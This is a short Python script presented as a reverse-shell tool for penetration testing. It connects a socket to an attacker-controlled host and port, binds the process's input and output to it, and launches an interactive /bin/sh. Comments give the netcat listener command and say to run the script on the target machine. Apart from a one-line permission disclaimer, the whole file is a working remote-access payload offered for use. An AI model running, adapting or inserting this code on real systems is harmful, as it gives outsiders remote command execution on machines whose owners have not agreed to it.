# cyberdudebivash's reverse shell
# Disclaimer: This tool is for ethical pentesting purposes only. Use with permission on authorized systems.
# Listener setup: On attacker machine, run `nc -lvnp <port>` to listen.
# Run this script on the target machine.

import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    subprocess.call(["/bin/sh", "-i"])  # For Unix-like systems; use ["cmd.exe"] for Windows

# Usage: Replace with your attacker's IP and port
if __name__ == "__main__":
    HOST = "127.0.0.1"  # e.g., "192.168.1.100"
    PORT = 4444           # e.g., 4444
    reverse_shell(HOST, PORT)